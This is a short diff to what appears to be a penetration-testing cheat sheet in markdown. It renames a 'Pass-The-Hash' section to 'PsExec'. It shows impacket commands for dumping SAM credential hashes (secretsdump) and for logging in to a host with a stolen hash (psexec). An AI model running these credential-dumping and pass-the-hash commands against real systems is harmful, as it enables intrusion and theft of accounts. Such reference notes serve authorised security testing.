@@ -26,9 +26,9 @@ $ python /opt/impacket/examples/secretsdump.py -sam XXX -system YYY LOCAL
 
 <br>
 
-#### Pass-The-Hash
+#### PsExec
 
-Use a hash to login.
+Use a hash to login (Pass-The-Hash).
 
 ```shell!
 $ python /opt/impacket/examples/psexec.py -hashes usernamehash:sessionhash username@IP
